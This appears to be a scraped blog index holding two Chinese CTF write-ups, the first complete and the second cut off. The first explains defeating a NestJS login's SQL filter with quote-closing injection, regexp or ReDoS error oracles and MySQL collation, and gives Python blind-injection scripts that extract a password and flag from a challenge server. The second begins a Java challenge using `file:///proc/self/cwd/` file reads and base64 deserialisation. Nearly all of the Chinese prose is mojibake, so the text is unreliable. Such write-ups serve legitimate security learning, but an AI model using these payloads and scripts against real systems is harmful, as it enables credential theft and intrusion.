'@nestjs/common';\rimport { ConnectionProvider } from '../database/connection.provider';\rexport class User {\rid: number;\rusername: string;\r}\rfunction safe(str: string): string {\rconst r = str\r.replace(/[\\s,()#;*\\-]/g, '')\r.replace(/^.*(?=union|binary).*$/gi, '')\r.toString();\rreturn r;\r}\r@Injectable()\rexport class AuthService {\rconstructor(private connectionProvider: ConnectionProvider) {}\rasync validateUser(username: string, password: string): Promise\u0026lt;User\u0026gt; | null {\rconst sql = `SELECT * FROM auth WHERE username='${safe(username)}' LIMIT 1`;\rconst [rows] = await this.connectionProvider.use((c) =\u0026gt; c.query(sql));\rconst user = rows[0];\rif (user \u0026amp;\u0026amp; user.password === password) {\r// eslint-disable-next-line @typescript-eslint/no-unused-vars\rconst { password, ...result } = user;\rreturn result;\r}\rreturn null;\r}\r}\r```\ræˆ‘ä»¬ä¼ å…¥çš„usernameç»è¿‡äº†è¿‡æ»¤ï¼Œæ‹¬å·ç©ºæ ¼ç­‰ç­‰ç‰¹æ®Šå­—ç¬¦ä¸èƒ½ç”¨ï¼Œunionè¢«è¿‡æ»¤ä¸èƒ½è”åˆæŸ¥è¯¢ï¼Œbinaryè¢«è¿‡æ»¤ä¸èƒ½é€šè¿‡å®ƒæ¥åŒºåˆ†å¤§å°å†™ã€‚ä¼ å…¥usernameä»¥åä¼šå¯¹è¡¨è¿›è¡ŒæŸ¥è¯¢ï¼ŒæŸ¥å‡ºè®°å½•å†å¯¹ä¼ å…¥çš„å¯†ç passwordè¿›è¡Œæ¯”å¯¹ï¼Œé€šè¿‡å°±è¿”å›resultï¼Œä¹Ÿå°±æ˜¯flagã€‚\nå…ˆéšä¾¿ä¼ ç‚¹ä¸œè¥¿çœ‹ä¸€ä¸‹å›æ˜¾ã€‚SQLæ³¨å…¥ä¼ ç»Ÿè‰ºèƒ½ï¼šé—­åˆå¼•å·ã€‚è¿™é‡Œç›´æ¥å¿½ç•¥ç©ºæ ¼äº†ï¼Œç›¸å½“äºç”¨å¼•å·ä½œåˆ†éš”ï¼ŒåŒºåˆ†å¼€äº†å…³é”®å­—å’Œå­—ç¬¦ä¸²ï¼›ç„¶ååªè¦ä¸ç”¨å¸¦æ‹¬å·çš„å‡½æ•°ï¼Œå°±ä¸ä¼šç”¨åˆ°æ‹¬å·ã€‚æ‰€ä»¥ç›´æ¥ç»•è¿‡ç¬¬ä¸€ä¸ªreplaceçš„è¿‡æ»¤äº†ã€‚\nusername: 1'or'1'='1\rpassword: '123456'\rSQLè¯­å¥: SELECT * FROM auth WHERE username='1'or'1'='1' LIMIT 1\rè¿”å›: {\u0026quot;statusCode\u0026quot;:401,\u0026quot;message\u0026quot;:\u0026quot;Unauthorized\u0026quot;}\rè¯•äº†å¾ˆå¤šï¼Œå¥½åƒéƒ½æ²¡æœ‰åŠæ³•å¾—åˆ°å…¶ä»–çš„å›æ˜¾ï¼Œåƒä¼ ç»Ÿæ—¶é—´ç›²æ³¨ï¼Œå› ä¸ºæ‹¬å·è¢«è¿‡æ»¤äº†ï¼Œå¾ˆå¤šæ“ä½œæ²¡èƒ½å®ç°ã€‚ä¸è¿‡è¿™é‡Œå‘ç°è¯­å¥å‡ºé”™æˆ–è€…sqlç‚¸æ‰çš„æ—¶å€™ä¼šæŠ¥501ã€‚è¿™é‡Œå°±æœ‰ä¸¤ä¸ªå›æ˜¾äº†ã€‚\näºæ˜¯å¼€å§‹å’Œpyyæ€è€ƒå¦‚ä½•åšåˆ°æœ‰æ­£ç¡®è¿”å›å€¼çš„æ—¶å€™ç»™401ï¼Œæœ‰é”™è¯¯è¿”å›å€¼çš„æ—¶å€™ç»™500ã€‚é¢˜ç›®å¾ˆé•¿æ—¶é—´æ²¡äººè§£ï¼Œå‡ºé¢˜äººç»™äº†ä¸ªregexpçš„æç¤ºï¼Œå†åŠ ä¸Šåæ¥é«˜è¡¨å“¥ç‚¹äº†ä¸€ä¸ªReDosï¼Œæ‰€ä»¥å¼€å§‹é¡ºç€è¿™ä¸ªæ–¹å‘æ‘¸ç´¢ã€‚\nMySQLæ¢ç´¢ åˆ°è¿™é‡Œï¼Œé¢˜ç›®å…ˆæ”¾ä¸€è¾¹ï¼Œå…ˆå¼€ä¸ªsqléšä¾¿è¯•è¯•ã€‚é¢˜ç›®ç»™äº†mysql8ï¼Œæˆ‘è¿™é‡Œå¼€äº†ä¸€ä¸ªmysql8.0.16ã€‚\næ ¹æ®é¢˜ç›®ç»™çš„sqlå†…å®¹æ–°å»ºä¸€ä¸ªåº“ç”¨æ¥æµ‹è¯•ã€‚\nimage-20220320150618144\ræŠŠsqlè¯­å¥æ¥è¿›å»ï¼Œå›æ˜¾æ­£å¸¸ã€‚\nimage-20220320150854245\rmysqlçš„oræœ‰çŸ­è·¯æœºåˆ¶ï¼Œå¦‚æœå¤šä¸ªoræ‹¼æ¥ï¼Œå‰é¢åˆ¤æ–­ä¸ºtrueçš„æ—¶å€™ï¼Œåé¢çš„orå†…å®¹å°±ä¼šè¢«çŸ­è·¯ä¸è¿›è¡Œåˆ¤æ–­ï¼›å¦‚æœå‰é¢ä¸ºfalseï¼Œä¼šç»§ç»­å¾€ååˆ¤æ–­ï¼›æœ€ç»ˆå¦‚æœæ²¡æœ‰ä¸€ä¸ªtrueï¼Œå°±ä¼šè¿”å›falseã€‚\nimage-20220320152024497\rç„¶åæ¢è®¨ä¸€ä¸‹regexpçš„æœºåˆ¶ã€‚æ­£å¸¸å»åŒ¹é…çš„æ—¶å€™ï¼Œéµå¾ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œå¦‚æœåŒ¹é…æˆåŠŸå°±ä¼šè¿”å›æŸ¥è¯¢çš„ä¿¡æ¯ï¼Œå¦‚æœåŒ¹é…ä¸æˆåŠŸå°±è¿”å›ç©ºå€¼ï¼ŒåŒæ—¶å¦‚æœè¡¨è¾¾å¼å‡ºé”™çš„è¯SQLå°±ä¼šç‚¸æ‰ã€‚\nimage-20220320152544638\rReDos é‚£ä¹ˆä»€ä¹ˆæ˜¯ReDoså‘¢ï¼Ÿ\næ­£åˆ™è¡¨è¾¾å¼é‡Œé¢æœ‰ä¸¤ä¸ªé‡å¤è¿ç®—ç¬¦*å’Œ+ï¼Œ*ä»£è¡¨é‡å¤é›¶æ¬¡æˆ–å¤šæ¬¡ï¼Œ+ä»£è¡¨é‡å¤ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚è¿™é‡Œé™„ä¸Šä¸€ä¸ªéªŒè¯æ­£åˆ™è¡¨è¾¾å¼çš„ç½‘å€ï¼Œå¯ä»¥å¾ˆå¥½åœ°éªŒè¯æˆ‘ä»¬çš„æ­£åˆ™å†™çš„å¯¹ä¸å¯¹ã€‚é’ˆå¯¹æ­£åˆ™çš„é‡å¤è¿ç®—ç¬¦ï¼Œé¦–å…ˆéœ€è¦äº†è§£å®ƒçš„åŒ¹é…æœºåˆ¶ã€‚ä¸‹é¢å…ˆè§£é‡Šå‡ ä¸ªé—®é¢˜ã€‚\nDFAï¼ˆç¡®å®šæ€§æœ‰é™çŠ¶æ€è‡ªåŠ¨æœºï¼‰å’ŒNFAï¼ˆéç¡®å®šæ€§æœ‰é™çŠ¶æ€è‡ªåŠ¨æœºï¼‰çš„åŒºåˆ«\nDFA\ré€šä¿—ä¸€ç‚¹è§£é‡Šå°±æ˜¯æ‹¿ä¸€æ•´ä¸²å­—ç¬¦ä¸²ä¸æ‹†åˆ†å¼€çš„æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…åŒ¹é…ã€‚\ræ¯”å¦‚åŒ¹é…'abbbc'ï¼Œæ­£åˆ™è¡¨è¾¾å¼ä¸º'ab{1,3}c'ï¼ŒåŒ¹é…è¿‡ç¨‹å¦‚ä¸‹ï¼š\ra åŒ¹é… a\rab åŒ¹é… ab{1,3}\rabb åŒ¹é… ab{1,3}\rabbb åŒ¹é… ab{1,3} // åˆšå¥½æœ€å¤šä¸‰ä¸ªbç»“æŸ\rabbbc åŒ¹é… ab{1,3}c NFA\rä¹Ÿé€šä¿—ä¸€ç‚¹è§£é‡Šå°±æ˜¯æ‹¿æ•´ä¸ªæ­£åˆ™è¡¨è¾¾å¼ä¸å­—ç¬¦ä¸²çš„é€ä¸ªå­—ç¬¦åŒ¹é…ã€‚\r....å†™ç€å†™ç€å‘ç°æœ‰ç‚¹ä¸å¯¹ï¼Œå…ˆæ”¾ç€....\rMySQLå±äºNFAï¼Œå­˜åœ¨å›æº¯æœºåˆ¶ã€‚\nå…³äºé‡å¤è¿ç®—ç¬¦+å’Œ*çš„åŒºåˆ«ï¼ˆå°±æ˜¯è‡³å°‘ä¸€æ¬¡å’Œé›¶æ¬¡çš„åŒºåˆ«ï¼‰\nca*t åŒ¹é… caaaaatå’Œct\rca+t åŒ¹é… caaaaat\rè´ªå©ªåŒ¹é…å’Œéè´ªå©ªåŒ¹é…\nx.*y åŒ¹é… xaaaaayqweqxbbbbby\rx.*?y åŒ¹é… xaaaaayå’Œxbbbbby\rå›æº¯\nä¸ç®¡æ˜¯è´ªå©ªåŒ¹é…è¿˜æ˜¯éè´ªå©ªåŒ¹é…ï¼Œå¦‚æœç»™å‡ºçš„è¡¨è¾¾å¼æ˜¯ä¸æ°å½“çš„ï¼Œè®¡ç®—æœºå¤„ç†çš„æ—¶å€™ä¼šè¿›è¡Œå›æº¯ï¼ˆè‡³äºä»€ä¹ˆæ˜¯æ°å½“çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œä¹‹åæœ‰ç©ºå†ç»†è¯´ï¼‰\næ¯”å¦‚æˆ‘éœ€è¦åŒ¹é…xabcdyabcï¼Œç»™å‡ºçš„è¡¨è¾¾å¼æ˜¯x.*yï¼Œé‚£ä¹ˆè®¡ç®—æœºè¿›è¡ŒåŒ¹é…çš„æµç¨‹åº”è¯¥æ˜¯ï¼š\nx åŒ¹é… x\rxa åŒ¹é… x.*\rxab åŒ¹é… x.*\rxabc åŒ¹é… x.*\rxabcd åŒ¹é… x.*\rxabcdy åŒ¹é… x.*\rxabcdya åŒ¹é… x.*\rxabcdyab åŒ¹é… x.*\rxabcdyabc åŒ¹é… x.* // æ³¨æ„ï¼Œè¿™é‡Œå·²ç»åŒ¹é…å®Œäº†ï¼Œå¼€å§‹å›æº¯\rxabcdyab åŒ¹é… x.*\rxabcdya åŒ¹é… x.*\rxabcdy åŒ¹é… x.*\rxabcd åŒ¹é… x.*\rxabcdy åŒ¹é… x.*y\rå¯è§ï¼Œå¦‚æœåŒ¹é…çš„è¿‡ç¨‹ä¸­äº§ç”Ÿå›æº¯ï¼Œå°†ä¼šå¤§å¤§é™ä½æ•ˆç‡ã€‚æ‰€ä»¥å‡å¦‚æˆ‘ä»¬éœ€è¦åŒ¹é…aaaaaaaaaaaaaaaaaï¼Œç»™å‡ºçš„è¡¨è¾¾å¼æ˜¯(a+)+bï¼Œæˆ‘ä»¬èƒ½è½»æ˜“çœ‹å‡ºæ¥è¿™æ˜¯ä¸åŒ¹é…çš„ï¼Œä½†æ˜¯è®¡ç®—æœºä¼šå¯¹å…¶è¿›è¡Œå›æº¯ï¼Œåšå¾ˆå¤šæ²¡æœ‰å¿…è¦ä¸”æ„šè ¢çš„æ“ä½œï¼Œç„¶åå¯¼è‡´æ“ä½œæ­¥æ•°è¿‡å¤šï¼Œè¶…æ—¶æˆ–è€…å´©æºƒã€‚åˆ©ç”¨è¿™ä¸€ç‚¹å¯ä»¥è¾¾åˆ°Dosçš„æ•ˆæœã€‚\nå¦‚æœåœ¨MySqlé‡Œé¢è¯•ï¼Œä¼šæŠ¥è¶…æ—¶ã€‚\nimage-20220320180534057\ræˆ–è€…åœ¨pythoné‡Œé¢è¯•ï¼Œä¼šå¡æ­»ã€‚\nimage-20220320180658644\rå°è¯•è§£é¢˜ äº†è§£äº†ä¸Šé¢è¿™äº›ä¸œè¥¿ï¼Œå·®ä¸å¤šå¯ä»¥å¼€å§‹è§£é¢˜äº†ã€‚æˆ‘ä»¬å°è¯•å¯¹ç»™å‡ºçš„sqlè¯­å¥è¿›è¡Œæ‹¼æ¥ï¼Œåˆ©ç”¨orçš„çŸ­è·¯è§„åˆ™å’ŒregexpæŸ¥è¯¢ã€åˆ¶é€ æŠ¥é”™ã€‚\nimage-20220320213048644\rå½“ç„¶ä¹Ÿå¯ä»¥ç”¨ReDosåˆ¶é€ è¶…æ—¶ã€‚\nimage-20220320213203235\rç„¶åå°±å¯ä»¥æ„‰å¿«å†™è„šæœ¬ç›²æ³¨å•¦~\nimport requests\rpasswd=\u0026quot;\u0026quot;\rlista=\u0026quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\u0026quot;\rwhile True:\rfor i in lista:\rexp=\u0026quot;'or`password`regexp'^\u0026quot;+passwd+i+\u0026quot;'or`password`regexp'[\u0026quot;\r#print(exp)\rdata={\u0026quot;username\u0026quot;:exp,\u0026quot;password\u0026quot;:\u0026quot;123456\u0026quot;}\rres = requests.post(\u0026quot;http://47.107.231.226:36804/login\u0026quot;,data=data)\r#print(res.text)\rif('401' in res.text):\rpasswd+=i\rprint(passwd)\rbreak\råŒæ ·å¯¹usernameè¿›è¡Œç›²æ³¨ï¼Œå¾—åˆ°çš„ç»“æœå¦‚ä¸‹ï¼š\nusername: QAY8TEFYZC67AEOO\rpassword: M52FPLDXYYLB\rä½†æ˜¯æ„Ÿè§‰æœ‰äº›å¥‡æ€ªï¼Œä¸€æ—¶è¯´ä¸ä¸Šæ¥å¥‡æ€ªåœ¨å“ªé‡Œ\u0026hellip;æ‰€ä»¥å°è¯•æ‹¿å»ç™»å½•äº†ä¸€ä¸‹ã€‚\nå•Šå“¦ï¼Œæ˜¯é”™çš„ã€‚æ‰€ä»¥é‡æ–°å»çœ‹å“ªé‡Œæœ‰é—®é¢˜ï¼ˆå…¶å®ä¹Ÿæ²¡æœ‰å»çœ‹ï¼Œå½“æ—¶åœ¨å’Œé«˜è¡¨å“¥é€šç”µè¯ï¼Œä»–æç‚¹äº†ä¸€ä¸‹ï¼Œå˜¿å˜¿ï¼ŒåŒ–è…æœ½ä¸ºç¥å¥‡çš„å¥½å¤§å“¥~ï¼‰\né‡æ–°çœ‹ä¸€éhint.mdï¼Œä»”ç»†çœ‹è¿‡æ»¤çš„åœ°æ–¹ã€‚\nfunction safe(str: string): string {\rconst r = str\r.replace(/[\\s,()#;*\\-]/g, '')\r.replace(/^.*(?=union|binary).*$/gi, '')\r.toString();\rreturn r;\r}\rå‘ç°é™¤äº†unionè¢«è¿‡æ»¤ï¼Œè¿˜æœ‰ä¸€ä¸ªbinaryã€‚binaryå…³é”®å­—åœ¨mysqlé‡Œç”¨æ¥åŒºåˆ†å¤§å°å†™ï¼Œmysqlé»˜è®¤æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ã€‚çœ‹ä¸‹é¢çš„ä¾‹å­ã€‚\nimage-20220320214957473\rä½†æ˜¯ç°åœ¨binaryè¢«è¿‡æ»¤äº†ï¼Œåªèƒ½å¦å¯»ä»–è·¯ã€‚\nç»è¿‡ä¸€ç•ªæœå¯»ï¼Œå‘ç°collateä¹Ÿå¯ä»¥åšåˆ°è®©mysqlåŒºåˆ†å¤§å°å†™ã€‚è¿™é‡Œå°±æ¶‰åŠåˆ°mysqlé»˜è®¤å­—ç¬¦é›†çš„é—®é¢˜ã€‚\nMySQLå­—ç¬¦é›† åœ¨æˆ‘ä»¬çš„è®¤çŸ¥é‡Œï¼ŒåŸºæœ¬ä¸Šå­—ç¬¦çš„æ¯”è¾ƒéƒ½æ˜¯é€šè¿‡å…ˆè½¬æ¢æˆasciiï¼Œå†æ ¹æ®asciiå­—ç¬¦é›†è¿›è¡Œæ¯”è¾ƒï¼›ç‰¹åˆ«çš„ï¼Œåƒphpé‚£æ ·çš„å¼±ç±»å‹æ¯”è¾ƒï¼Œå¦‚æœå­—ç¬¦å’Œæ•°å­—è¿›è¡Œæ¯”è¾ƒä¼šå…ˆæŠŠå­—ç¬¦è½¬æ¢æˆ0ã€‚ä¸‹é¢æ¥çœ‹mysqlç‰¹æ®Šçš„ä¾‹å­ã€‚é¦–å…ˆçŸ¥é“\u0026rsquo;a\u0026rsquo;å¯¹åº”çš„asciiæ˜¯97ï¼Œ\u0026lsquo;8\u0026rsquo;å¯¹åº”çš„asciiæ˜¯56ï¼Œ\u0026rsquo;@\u0026lsquo;å¯¹åº”çš„asciiæ˜¯64ï¼Œ\u0026rsquo;~\u0026lsquo;å¯¹åº”çš„asciiæ˜¯126ã€‚å¦‚æœå¯¹è¿™å‡ ä¸ªå­—ç¬¦è¿›è¡Œæ¯”è¾ƒï¼Œæˆ‘ä»¬çš„ç¬¬ä¸€ååº”åº”è¯¥æ˜¯ '~'\u0026gt;'a'\u0026gt;'@'\u0026gt;'8'ã€‚ä½†æ˜¯çœ‹ä¸€ä¸‹åœ¨mysqlé‡Œè¿è¡Œçš„ç»“æœã€‚\nmysql\u0026gt; select 'a'\u0026gt;'1';\r+---------+\r| 'a'\u0026gt;'1' |\r+---------+\r| 1 |\r+---------+\r1 row in set (0.05 sec)\rmysql\u0026gt; select '@'\u0026gt;'a';\r+---------+\r| '@'\u0026gt;'a' |\r+---------+\r| 0 |\r+---------+\r1 row in set (0.00 sec)\rmysql\u0026gt; select '@'\u0026gt;'8';\r+---------+\r| '@'\u0026gt;'8' |\r+---------+\r| 0 |\r+---------+\r1 row in set (0.00 sec)\rmysql\u0026gt; select '~'\u0026gt;'a';\r+---------+\r| '~'\u0026gt;'a' |\r+---------+\r| 0 |\r+---------+\r1 row in set (0.05 sec)\rmysql\u0026gt; select '~'\u0026gt;'8';\r+---------+\r| '~'\u0026gt;'8' |\r+---------+\r| 0 |\r+---------+\r1 row in set (0.00 sec)\rmysql\u0026gt; select '@'\u0026gt;'a';\r+---------+\r| '@'\u0026gt;'a' |\r+---------+\r| 0 |\r+---------+\r1 row in set (0.00 sec)\rmysql\u0026gt; select '@'\u0026gt;'8';\r+---------+\r| '@'\u0026gt;'8' |\r+---------+\r| 0 |\r+---------+\r1 row in set (0.00 sec)\rmysql\u0026gt; select 'a'\u0026gt;'8';\r+---------+\r| 'a'\u0026gt;'8' |\r+---------+\r| 1 |\r+---------+\r1 row in set (0.00 sec)\rå¾ˆå¥‡æ€ªï¼Œè¿™å’Œæˆ‘ä»¬çš„ç›´è§‰ä¸ç¬¦ï¼Œå’ŒäºŒå¸ˆå‚…ã€nkkä»¥åŠè¿œæ–¹çš„é«˜è¡¨å“¥åœ¨å®éªŒå®¤æ¢è®¨äº†å¾ˆä¹…è¿™ä¸ªé—®é¢˜ã€‚æœ€åå‘ç°å…¶å®æ˜¯å­—ç¬¦é›†çš„é”…ã€‚\nmysql8æŠŠé»˜è®¤å­—ç¬¦é›†æ¢æˆäº†utf8mb4_0900_ai_ciï¼Œå¯ä»¥æŸ¥è¯¢çœ‹çœ‹ã€‚\nimage-20220320221936369\räºŒå¸ˆå‚…æœåˆ°è¿™ä¸ªå­—ç¬¦é›†ï¼Œå‘ç°å®ƒé»˜è®¤æ˜¯æŠŠä¸€äº›ç‰¹æ®Šçš„å­—ç¬¦æ”¾åœ¨äº†æ•°å­—å’Œå­—æ¯çš„å‰é¢ï¼Œåƒæˆ‘ä»¬ç”¨åˆ°çš„ \u0026lsquo;@\u0026lsquo;å’Œ\u0026rsquo;~\u0026rsquo; åœ¨è¿™ä¸ªå­—ç¬¦é›†é‡Œéƒ½æ˜¯æ¯”æ•°å­—å’Œå­—æ¯å°çš„ï¼Œæ‰€ä»¥å¾—åˆ°äº†ä¸Šé¢çš„ç»“æœã€‚ä»¥åŠï¼Œé™„ä¸Šå¯¹äºè¿™ä¸ªå­—ç¬¦é›†çš„è¯´æ˜ã€‚æ„Ÿè°¢@äºŒå¸ˆå‚…ã€‚\nè¯´å›åŒºåˆ†å¤§å°å†™çš„é—®é¢˜ï¼Œè¿™ä¸ªå­—ç¬¦é›†å¸¦ç€ciï¼Œè¯´æ˜æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹mysqlä½¿ç”¨çš„å­—ç¬¦é›†æ¥å®ç°è¿™ä¸ªåŠŸèƒ½ã€‚è¿™é‡Œæ‰¾ä¸€ä¸ªèƒ½å¤ŸåŒºåˆ†å¤§å°å†™çš„å­—ç¬¦é›†å°±å¯ä»¥ã€‚\næ‰€ä»¥ä¿®æ”¹ä¸€ä¸‹sqlè¯­å¥ï¼š\nimage-20220320224045559\rè¿™é‡Œæ³¨æ„ï¼Œè¿™ä¸ªcollateè¦æ¥åœ¨å¾…æ¯”è¾ƒæˆ–è€…åŒ¹é…å­—ç¬¦è¯­å¥çš„åé¢ã€‚åƒä¸Šé¢çš„è¯­å¥ï¼Œå¦‚æœæ¥åœ¨æœ€åæ˜¯ä¸èµ·ä½œç”¨çš„ã€‚\nåˆ°è¿™é‡Œå°±å¯ä»¥å®ç°åŒºåˆ†å¤§å°å†™çš„åŠŸèƒ½äº†ã€‚ä½†æ˜¯æœ€åæ³¨å‡ºçš„å¯†ç è¿˜æ˜¯ä¸å¯¹ï¼Œè€ƒè™‘åˆ°å¯èƒ½æ˜¯å­˜åœ¨ç‰¹æ®Šå­—ç¬¦ï¼Œé«˜è¡¨å“¥è¯•äº†å¾ˆå¤šä¸ªæœ€åè¯•å‡ºæ¥å­˜åœ¨çš„ç‰¹æ®Šå­—ç¬¦æ˜¯^$!ã€‚è¿™é‡Œæ—¢ç„¶å­˜åœ¨^ï¼Œè¿™åœ¨æ­£åˆ™è¡¨è¾¾å¼é‡Œé¢æ˜¯å…³é”®å­—ç¬¦ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨regexpå»æ³¨å…¥ï¼Œæœ€åæ¢æˆlikeè§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚\né™„ä¸Šå®Œæ•´è„šæœ¬ã€‚\nimport requests\ra=\u0026quot;\u0026quot;\rpasswd=\u0026quot;\u0026quot;\rlista=\u0026quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789$!^\u0026quot;\rwhile True:\rfor i in lista:\rexp=\u0026quot;'or`password`like'\u0026quot;+passwd+i+\u0026quot;%'collate'utf8mb4_bin'or`username`regexp'[\u0026quot;\rdata={\u0026quot;username\u0026quot;:exp,\u0026quot;password\u0026quot;:\u0026quot;123456\u0026quot;}\rres = requests.post(\u0026quot;http://47.107.231.226:36804/login\u0026quot;,data=data)\rif('401' in res.text):\rpasswd+=i\rprint(passwd)\rbreak\ræœ€åçš„ç»“æœæ˜¯\nusername: QaY8TeFYzC67aeoO\rpassword: m52FPlDxYyLB^eIzAr!8gxh$\ræ‹¿ç€å»ç™»å½•ï¼Œè¿”å›flagã€‚\nHFCTF{0990de0f-a5ea-4c47-90f7-7c92ba1eac80}\rå‚è€ƒèµ„æ–™ Regular expression Denial of Service - ReDoS\næ­£åˆ™è¡¨è¾¾å¼æ‰€å¼•å‘çš„DoSæ”»å‡»ï¼ˆRedosï¼‰\nMYSQLä¸­çš„COLLATEæ˜¯ä»€ä¹ˆï¼Ÿ å†™åœ¨æœ€å æ‹¿ä¸€è¡€çš„é«˜è¡¨å“¥ï¼Œyydsï¼\nè¿˜æ˜¯è¦å¤šç»ƒå¤šç»ƒå¤šç»ƒå¤šç»ƒå¤šç»ƒå¤šç»ƒå¤šç»ƒï¼ŒçŸ¥é“çš„ä¸œè¥¿è¶Šå¤šåœ¨æ¯”èµ›é‡Œè¶Šå¾—å¿ƒåº”æ‰‹ï¼ŒæŸ¥èµ„æ–™ä¹Ÿä¸ä¼šæ²¡æœ‰æ–¹å‘ã€‚å†™è¿™é“é¢˜çš„è¿‡ç¨‹è¿˜æ˜¯æ¯”è¾ƒåå·çš„ï¼Œä»ä¸çŸ¥é“æ€ä¹ˆç»•è¿‡æ»¤ï¼Œåˆ°ä¸çŸ¥é“æ€ä¹ˆç”¨æ­£åˆ™ï¼Œåˆ°ä¸çŸ¥é“æ€ä¹ˆåŒºåˆ†å¤§å°å†™ï¼›ä¸­é—´å†™è„šæœ¬çš„æ—¶å€™é‡åˆ°äº†å¾ˆå¤šå¥‡æ€ªçš„é—®é¢˜ï¼Œæ¯”å¦‚å¦‚æœä¿®æ”¹äº†å­—ç¬¦é›†ç”¨å¤§äºå°äºå·å»æ¯”è¾ƒçš„è¯åº”è¯¥ç”¨ä»€ä¹ˆå­—ç¬¦é›†å‘¢ï¼ˆå› ä¸ºæˆ‘å’Œnkkå€”å¼ºåœ°æƒ³ç”¨å¤§äºå°äºå·å»æ¯”è¾ƒ2333333ï¼‰ã€‚ä½†æ˜¯è¿™äº›é—®é¢˜ç•™å¾…ä»¥åå†æ¢è®¨å§ï¼\nèµ¶ä½œä¸šå»å˜~\n","date":"2022-03-20T00:00:00Z","permalink":"https://koali-www.github.io/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/","title":"ä»ä¸€é“é¢˜å­¦ReDosåŠSQLç›²æ³¨"},{"content":"å†™åœ¨å‰é¢ ç¬¬ä¸€æ¬¡æŠŠjavaçš„é¢˜ä»å¤´åˆ°å°¾åšå®Œï¼Œæ•´å®Œçš„æ—¶å€™å‘ç°é¢˜ç›®å¹¶ä¸éš¾ã€‚è¿‡ç¨‹ä¸­è¿˜æ˜¯å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ï¼Œæ„Ÿè°¢é«˜è¡¨å“¥å’Œnkkå’ŒäºŒå¸ˆå‚…ğŸ™‡â€\næ¯”èµ›çš„æ—¶å€™æ²¡æœ‰åšå‡ºæ¥ï¼Œç¯å¢ƒå…³æ‰äº†ï¼Œè™½ç„¶buuæœ‰å¤ç°ç¯å¢ƒï¼Œä½†æ˜¯ç”±äºéœ€è¦ç«äº‰ï¼Œbuuæœ‰é™åˆ¶ï¼Œæ‰€ä»¥æŠŠæºç æ‹¿ä¸‹æ¥åœ¨æœ¬åœ°æ­ã€‚\nå¤ç° æ‰“å¼€ç¯å¢ƒï¼ŒF12æŸ¥çœ‹æºç \nimage-20220302133247566\rè®¿é—®/file?\nimage-20220302133312575\réœ€è¦ä¼ å…¥ä¸€ä¸ªurlï¼ŒçŒœæµ‹æ˜¯éœ€è¦ç”¨åˆ°ä¼ªåè®®ä»»æ„è¯»æ–‡ä»¶ã€‚äºæ˜¯ä¼ å…¥file:///è¯»åˆ°æºç ã€‚æœ¬åœ°çš„è¯ç›´æ¥çŸ¥é“æºç è·¯å¾„ï¼Œå°±ä¸å¤šè¯´äº†ã€‚æ¯”èµ›çš„æ—¶å€™æ˜¯è¿œç¨‹ç¯å¢ƒï¼Œæˆ‘ä¸€å¼€å§‹ä¸çŸ¥é“webéƒ¨ç½²åœ¨å“ªé‡Œï¼Œæ‰€ä»¥æ‰¾äº†å¾ˆä¹…ï¼Œæœ€ååœ¨è¿™ä¸ªè·¯å¾„é‡Œæ‰¾åˆ°ã€‚\n/file?url=file:///usr/local/tomcat/\nçœ‹åˆ°é«˜è¡¨å“¥æ˜¯é€šè¿‡å½“å‰è¿è¡Œè¿›ç¨‹å»æ‰¾çš„ï¼Œè¿™æ ·æ‰¾å¥½åƒå¿«ä¸€äº›ï¼Œè®°å½•ä¸€ä¸‹ã€‚\n/file?url=file:///proc/self/cwd/\nç„¶åçœ‹åˆ°tomcatçš„ç›®å½•ç»“æ„ï¼Œè¿›webappsï¼Œæ‹¿åˆ°æºç æ‹¿å»åç¼–è¯‘ã€‚\nimage-20220302134240641\rHelloWorldServletç±»\npackage servlet;\rimport entity.User;\rimport java.io.IOException;\rimport java.util.Base64;\rimport javax.servlet.ServletException;\rimport javax.servlet.ServletOutputStream;\rimport javax.servlet.annotation.WebServlet;\rimport javax.servlet.http.HttpServlet;\rimport javax.servlet.http.HttpServletRequest;\rimport javax.servlet.http.HttpServletResponse;\rimport util.Secr3t;\rimport util.SerAndDe;\r@WebServlet(name = \u0026quot;HelloServlet\u0026quot;, urlPatterns = {\u0026quot;/evi1\u0026quot;})\r/* loaded from: HelloWorldServlet.class */\rpublic class HelloWorldServlet extends HttpServlet {\rprivate volatile String name = \u0026quot;m4n_q1u_666\u0026quot;;\rprivate volatile String age = \u0026quot;666\u0026quot;;\rprivate volatile String height = \u0026quot;180\u0026quot;;\rUser user;\rpublic void init() throws ServletException {\rthis.user = new User(this.name, this.age, this.height);\r}\rprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\rString reqName = req.getParameter(\u0026quot;name\u0026quot;);\rif (reqName != null) {\rthis.name = reqName;\r}\rif (Secr3t.check(this.name)) {\rResponse(resp, \u0026quot;no vnctf2022!\u0026quot;);\r} else if (Secr3t.check(this.name)) {\rResponse(resp, \u0026quot;The Key is \u0026quot; + Secr3t.getKey());\r}\r}\rprotected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\rString key = req.getParameter(\u0026quot;key\u0026quot;);\rString text = req.getParameter(\u0026quot;base64\u0026quot;);\rif (!Secr3t.getKey().equals(key) || text == null) {\rResponse(resp, \u0026quot;KeyError\u0026quot;);\rreturn;\r}\rif (this.user.equals((User) SerAndDe.deserialize(Base64.getDecoder().decode(text)))) {\rResponse(resp, \u0026quot;Deserializeâ€¦â€¦ Flag is \u0026quot; + Secr3t.getFlag().toString());\r}\r}\rprivate void Response(HttpServletResponse resp, String outStr) throws IOException {\rServletOutputStream out = 